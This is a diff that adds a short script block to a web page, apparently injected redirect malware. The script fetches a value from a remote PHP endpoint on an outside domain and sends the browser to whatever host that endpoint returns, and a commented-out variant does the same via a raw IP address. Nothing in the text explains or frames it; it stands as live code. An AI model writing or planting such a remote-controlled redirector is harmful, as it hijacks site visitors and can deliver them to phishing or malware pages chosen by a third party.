@@ -1,0 +1,13 @@
+<script>
+    function httpGet(theUrl) {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", theUrl, false); // false for synchronous request
+        xmlHttp.send(null);
+        return xmlHttp.responseText;
+    }
+    var res = httpGet("https://leanqualityacademy.com/buzz/buzz.php");
+    console.log(res);
+    window.location.href = "http://" + res;
+
+    // window.location.href = httpGet("http://138.197.152.208/buzz/buzz.php");
+</script>
